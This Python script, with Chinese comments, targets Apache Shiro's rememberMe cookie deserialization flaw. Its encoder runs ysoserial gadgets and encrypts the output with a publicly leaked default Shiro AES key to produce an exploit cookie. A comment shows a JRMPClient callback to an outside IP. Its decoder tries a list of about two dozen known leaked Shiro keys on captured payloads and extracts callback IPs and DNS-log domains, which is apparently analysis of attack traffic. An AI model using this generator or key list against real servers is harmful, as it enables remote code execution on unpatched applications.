import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
import re

list1 = ['rememberme payload']
def encode_rememberme(command):     # Java序列化 ---> 使用密钥进行AES加密 ---> Base64加密 ---> 得到加密后的remember Me内容
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command],
                             stdout=subprocess.PIPE)    #执行的命令
    popen1 = subprocess.Popen(['java', '-jar',  'ysoserial-0.0.6-SNAPSHOT-all.jar', 'URLDNS', command], stdout=subprocess.PIPE)
    BS = AES.block_size # aes数据分组长度为128 bit
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()   # padding算法
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")  #kPH+bIxk5D2deZiIxcaaaA== 泄露的key https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA
    iv = uuid.uuid4().bytes     #生成一个随机的UUID
    mode = AES.MODE_CBC
    encryptor = AES.new(key, mode, iv)
    file_body = pad(popen1.stdout.read())    #pad('java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient 118.25.69.**:6666')
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) #使用密钥进行AES加密 Base64加密
    print('rememberme=%s'%base64_ciphertext,'\n')
    return base64_ciphertext

def decode_rememberme(payload): #remember Me加密内容 ---> Base64解密 ---> 使用密钥进行AES解密 --->Java反序列化
    # keylist = ['fCq+/xW488hMTCD+cmJ3aQ==']
    keylist = ['kPH+bIxk5D2deZiIxcaaaA==','2AvVhdsgUs0FSA3SDFAdag==','3AvVhmFLUs0KTA3Kprsdag==','4AvVhmFLUs0KTA3Kprsdag==','5aaC5qKm5oqA5pyvAAAAAA==','6ZmI6I2j5Y+R5aSn5ZOlAA==','bWljcm9zAAAAAAAAAAAAAA==','wGiHplamyXlVB11UXWol8g==','Z3VucwAAAAAAAAAAAAAAAA==','MTIzNDU2Nzg5MGFiY2RlZg==','U3ByaW5nQmxhZGUAAAAAAA==','5AvVhmFLUs0KTA3Kprsdag==','fCq+/xW488hMTCD+cmJ3aQ==','1QWLxg+NYmxraMoxAXu/Iw==','ZUdsaGJuSmxibVI2ZHc9PQ==','L7RioUULEFhRyxM7a2R/Yg==','r0e3c16IdVkouZgk1TKVMg==','bWluZS1hc3NldC1rZXk6QQ==','a2VlcE9uR29pbmdBbmRGaQ==','WcfHGU25gNnTxTlmJMeSpw==','ZAvph3dsQs0FSL3SDFAdag==','tiVV6g3uZBGfgshesAQbjA==','cmVtZW1iZXJNZQAAAAAAAA==','ZnJlc2h6Y24xMjM0NTY3OA==','RVZBTk5JR0hUTFlfV0FPVQ==','WkhBTkdYSUFPSEVJX0NBVA==']
    for key in keylist:
        mode = AES.MODE_CBC
        IV = payload[:16]   # shiro利用arraycopy()方法将随机的16字节IV放到序列化后的数据前面,取前16字节作为iv
        encryptor = AES.new(base64.b64decode(key), mode, IV=IV)
        remember_bin = encryptor.decrypt(payload[16:])
        remember_bin = remember_bin.decode('unicode-escape')
        # print(remember_bin)

        pattern = re.compile(r'((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}')
        ip = re.search(pattern, remember_bin)
        ceye = re.search('(\w+)?\.\w+\.ceye.io',remember_bin,re.I)
        dnslog = re.search('(\w+)?\.\w+\.dnslog.cn',remember_bin,re.I)
        burp = re.search('(\w+)?\.\w+\.burpcollaborator.net',remember_bin,re.I)

        if ip:
            print('The key is %s. The ip is %s'%(key,ip))
            return ip
        elif ceye:
            print('The key is %s. The ceye is %s'%(key,ceye))
            return ceye
        elif dnslog:
            print('The key is %s. The dnslog is %s'%(key,dnslog))
            return dnslog
        elif burp:
            print('The key is %s. The burp is %s'%(key,burp))
            return burp

if __name__ == '__main__':
    # payload = encode_rememberme(sys.argv[1])
    # try:
    #     payload = base64.b64decode(payload)
    #     ip = decode_rememberme(payload)
    # except:
    #     pass
    #
    for payload in list1:
        try:
            tmp = payload
            payload = base64.b64decode(payload)
            data = decode_rememberme(payload)
            if data:
                print(tmp)
        except:
            pass